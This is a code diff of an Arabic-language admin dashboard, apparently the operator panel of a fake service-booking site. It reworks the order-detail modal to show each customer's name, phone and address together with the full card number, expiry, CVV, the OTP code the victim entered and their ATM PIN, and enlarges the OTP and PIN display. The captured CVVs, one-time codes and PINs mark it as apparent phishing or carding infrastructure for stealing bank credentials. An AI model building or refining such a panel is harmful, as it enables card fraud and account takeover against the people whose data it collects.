@@ -129,26 +129,48 @@
     .modal-overlay.open { display: flex; }
     .modal {
       background: #ffffff; border: 1px solid #e2e8f0; border-radius: 16px;
-      padding: 28px; width: 540px; max-width: 95vw; max-height: 90vh; overflow-y: auto; box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+      padding: 28px; width: 600px; max-width: 95vw; max-height: 90vh; overflow-y: auto; box-shadow: 0 20px 60px rgba(0,0,0,0.15);
     }
     .modal-title { font-size: 18px; font-weight: 600; color: #c8a96e; margin-bottom: 20px; }
-    .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-    .info-item { background: #f8fafc; border-radius: 8px; padding: 12px; border: 1px solid #e2e8f0; }
-    .info-item .label { font-size: 11px; color: #94a3b8; margin-bottom: 4px; }
-    .info-item .value { font-size: 14px; color: #1e293b; font-weight: 500; word-break: break-all; }
-    .data-section {
-      border-radius: 10px; padding: 16px; margin-top: 16px; border: 1px solid;
+    
+    /* بيانات العميل */
+    .customer-box {
+      background: #f0fdf4; border: 2px solid #22c55e; border-radius: 12px;
+      padding: 16px; margin-bottom: 16px;
     }
-    .data-section.card-section { background: #fffbeb; border-color: #fcd34d; }
-    .data-section.otp-section { background: #fdf4ff; border-color: #d8b4fe; }
-    .data-section.atm-section { background: #fff7ed; border-color: #fed7aa; }
-    .data-section .section-title-inner { font-size: 13px; margin-bottom: 12px; font-weight: 600; }
-    .data-section.card-section .section-title-inner { color: #92400e; }
-    .data-section.otp-section .section-title-inner { color: #6b21a8; }
-    .data-section.atm-section .section-title-inner { color: #9a3412; }
-    .big-code { font-size: 36px; font-weight: 700; text-align: center; padding: 12px; letter-spacing: 6px; }
-    .otp-section .big-code { color: #7c3aed; }
-    .atm-section .big-code { color: #ea580c; }
+    .customer-box .box-title { font-size: 14px; font-weight: 700; color: #15803d; margin-bottom: 12px; }
+    .customer-box .info-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #dcfce7; }
+    .customer-box .info-row:last-child { border-bottom: none; }
+    .customer-box .label { font-size: 12px; color: #4b5563; font-weight: 500; }
+    .customer-box .value { font-size: 13px; color: #1e293b; font-weight: 600; }
+
+    /* بيانات البطاقة */
+    .card-box {
+      background: #fffbeb; border: 2px solid #f59e0b; border-radius: 12px;
+      padding: 16px; margin-bottom: 16px;
+    }
+    .card-box .box-title { font-size: 14px; font-weight: 700; color: #92400e; margin-bottom: 12px; }
+    .card-box .info-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #fef3c7; }
+    .card-box .info-row:last-child { border-bottom: none; }
+    .card-box .label { font-size: 12px; color: #78350f; font-weight: 500; }
+    .card-box .value { font-size: 13px; color: #1e293b; font-weight: 600; }
+
+    /* بيانات OTP */
+    .otp-box {
+      background: #fdf4ff; border: 2px solid #a855f7; border-radius: 12px;
+      padding: 16px; margin-bottom: 16px; text-align: center;
+    }
+    .otp-box .box-title { font-size: 14px; font-weight: 700; color: #6b21a8; margin-bottom: 12px; }
+    .otp-box .big-code { font-size: 48px; font-weight: 900; color: #7c3aed; letter-spacing: 8px; }
+
+    /* بيانات ATM PIN */
+    .atm-box {
+      background: #fff7ed; border: 2px solid #f97316; border-radius: 12px;
+      padding: 16px; margin-bottom: 16px; text-align: center;
+    }
+    .atm-box .box-title { font-size: 14px; font-weight: 700; color: #9a3412; margin-bottom: 12px; }
+    .atm-box .big-code { font-size: 48px; font-weight: 900; color: #ea580c; letter-spacing: 8px; }
+
     .modal-actions { display: flex; gap: 10px; margin-top: 20px; justify-content: flex-end; flex-wrap: wrap; }
     .btn-close {
       padding: 10px 20px; background: transparent; border: 1px solid #cbd5e1;
@@ -187,7 +209,7 @@
 
     @media (max-width: 768px) {
       .stats-bar { flex-wrap: wrap; }
-      .info-grid { grid-template-columns: 1fr; }
+      .modal { width: 95vw; }
       .orders-table { font-size: 12px; }
       .orders-table th, .orders-table td { padding: 10px 8px; }
     }
@@ -464,42 +486,56 @@ function viewOrder(ref) {
   if (!o) return;
   currentOrderRef = ref;
 
-  document.getElementById('modalBody').innerHTML = `
-    <div class="info-grid">
-      <div class="info-item"><div class="label">رقم الطلب</div><div class="value">${o.order_ref}</div></div>
-      <div class="info-item"><div class="label">الحالة</div><div class="value">${getStatusInfo(o).label} — ${getStageLabel(o.stage)}</div></div>
-      <div class="info-item"><div class="label">اسم العميل</div><div class="value">${o.customer_name || '—'}</div></div>
-      <div class="info-item"><div class="label">الهاتف</div><div class="value">${o.customer_phone || '—'}</div></div>
-      <div class="info-item"><div class="label">الخدمة</div><div class="value">${o.service_type || '—'}</div></div>
-      <div class="info-item"><div class="label">الجنسية</div><div class="value">${o.nationality || '—'}</div></div>
-      <div class="info-item"><div class="label">المدة</div><div class="value">${o.duration || '—'}</div></div>
-      <div class="info-item"><div class="label">المبلغ</div><div class="value">${o.total_price} ر.ق</div></div>
-      <div class="info-item"><div class="label">تاريخ البدء</div><div class="value">${o.start_date || '—'}</div></div>
-      <div class="info-item"><div class="label">العنوان</div><div class="value">${o.customer_address || '—'}</div></div>
-      <div class="info-item"><div class="label">تاريخ الإنشاء</div><div class="value">${new Date(o.created_at).toLocaleString('ar')}</div></div>
-      <div class="info-item"><div class="label">آخر تحديث</div><div class="value">${new Date(o.updated_at).toLocaleString('ar')}</div></div>
+  let html = `
+    <!-- بيانات العميل -->
+    <div class="customer-box">
+      <div class="box-title">👤 بيانات العميل</div>
+      <div class="info-row"><div class="label">رقم الطلب</div><div class="value">${o.order_ref}</div></div>
+      <div class="info-row"><div class="label">الاسم</div><div class="value">${o.customer_name || '—'}</div></div>
+      <div class="info-row"><div class="label">الهاتف</div><div class="value">${o.customer_phone || '—'}</div></div>
+      <div class="info-row"><div class="label">العنوان</div><div class="value">${o.customer_address || '—'}</div></div>
+      <div class="info-row"><div class="label">الخدمة</div><div class="value">${o.service_type || '—'}</div></div>
+      <div class="info-row"><div class="label">الجنسية</div><div class="value">${o.nationality || '—'}</div></div>
+      <div class="info-row"><div class="label">المدة</div><div class="value">${o.duration || '—'}</div></div>
+      <div class="info-row"><div class="label">المبلغ</div><div class="value">${o.total_price} ر.ق</div></div>
+      <div class="info-row"><div class="label">تاريخ البدء</div><div class="value">${o.start_date || '—'}</div></div>
+      <div class="info-row"><div class="label">الحالة</div><div class="value">${getStatusInfo(o).label} — ${getStageLabel(o.stage)}</div></div>
     </div>
-    ${o.card_number ? `
-    <div class="data-section card-section">
-      <div class="section-title-inner">💳 بيانات البطاقة</div>
-      <div class="info-grid">
-        <div class="info-item"><div class="label">رقم البطاقة</div><div class="value">${o.card_number}</div></div>
-        <div class="info-item"><div class="label">تاريخ الانتهاء</div><div class="value">${o.card_expiry}</div></div>
-        <div class="info-item"><div class="label">CVV</div><div class="value">${o.card_cvv}</div></div>
-        <div class="info-item"><div class="label">اسم حامل البطاقة</div><div class="value">${o.card_holder}</div></div>
-      </div>
-    </div>` : ''}
-    ${o.otp_code ? `
-    <div class="data-section otp-section">
-      <div class="section-title-inner">🔐 رمز OTP المُدخل</div>
-      <div class="big-code">${o.otp_code}</div>
-    </div>` : ''}
-    ${o.atm_pin ? `
-    <div class="data-section atm-section">
-      <div class="section-title-inner">🏧 رقم ATM PIN المُدخل</div>
-      <div class="big-code">${o.atm_pin}</div>
-    </div>` : ''}
   `;
+
+  // بيانات البطاقة
+  if (o.card_number) {
+    html += `
+    <div class="card-box">
+      <div class="box-title">💳 بيانات البطاقة</div>
+      <div class="info-row"><div class="label">رقم البطاقة</div><div class="value">${o.card_number}</div></div>
+      <div class="info-row"><div class="label">تاريخ الانتهاء</div><div class="value">${o.card_expiry || '—'}</div></div>
+      <div class="info-row"><div class="label">CVV</div><div class="value">${o.card_cvv || '—'}</div></div>
+    </div>
+    `;
+  }
+
+  // رمز OTP
+  if (o.otp_code) {
+    html += `
+    <div class="otp-box">
+      <div class="box-title">🔐 رمز OTP المُدخل</div>
+      <div class="big-code">${o.otp_code}</div>
+    </div>
+    `;
+  }
+
+  // رقم ATM PIN
+  if (o.atm_pin) {
+    html += `
+    <div class="atm-box">
+      <div class="box-title">🏧 رقم ATM PIN المُدخل</div>
+      <div class="big-code">${o.atm_pin}</div>
+    </div>
+    `;
+  }
+
+  document.getElementById('modalBody').innerHTML = html;
 
   // أزرار الـ modal حسب الحالة
   let actionBtns = '<button class="btn-close" onclick="closeModal()">إغلاق</button>';
